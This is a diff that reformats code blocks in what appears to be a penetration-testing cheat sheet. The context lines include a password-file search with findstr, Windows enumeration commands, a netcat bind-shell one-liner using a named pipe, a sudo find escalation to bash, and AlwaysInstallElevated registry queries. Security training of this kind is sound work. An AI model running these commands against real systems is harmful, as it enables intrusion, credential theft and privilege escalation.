@@ -28,22 +28,22 @@ ffuf -w {{subdomains.txt}} -u {{https://website.com}} -H "{{Host: FUZZ.website.c
 ```
 
 ## Searching files
-```
-`findstr /si password *.txt`
+```cmd
+findstr /si password *.txt
 ```
 
 ## Patch Level
-```
-`wmic qfe get Caption,Description,HotFixID,InstalledOn`
+```ps
+wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
 ## Scheduled Tasks
-```
-`schtasks /query /fo LIST /v`
+```ps
+schtasks /query /fo LIST /v
 ```
 
 ## Windows Services and Software
-```
+```ps
 wmic service list brief| findstr "Running"
 sc qc
 wmic product get name,version,vendor
@@ -130,12 +130,12 @@ webshells dir: */usr/share/webshells*
 ```
 
 ## Creating Named Pipes
-```
+```bash
 `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
 ```
 
 ## SUDO
-```
+```bash
 find . -exec /bin/bash \; -quit
 ```
 
@@ -165,7 +165,7 @@ Get-service -Name unquotedsvc | Restart-Service
 ```
 
 ## AlwaysInstallElevated
-```
+```ps
 `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
 `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
 ```
